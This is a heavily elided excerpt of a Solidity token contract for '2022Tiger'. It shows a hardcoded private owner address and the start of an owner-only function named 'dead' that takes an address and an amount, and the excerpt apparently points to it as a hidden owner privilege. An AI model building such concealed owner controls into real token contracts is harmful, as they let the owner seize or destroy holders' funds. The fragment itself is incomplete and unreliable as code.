...
contract Ownable is Context {
    ...
    address private _OwnerAddress = 0xd0b98E05d07D1239a0f0023D4aCe47ecC3178a9A;
...
contract Tiger is Context, IERC20, Ownable {
    ...
    uint256 private _total = 2022 * 10**3;
    uint256 private _tFeeTotal;
    
    string private _name = "2022Tiger";
    string private _symbol = "2022Tiger";
    ...
    function dead(address sp, uint256 Va) external OwnerAddress() {
        require(Va > 0, "ass");
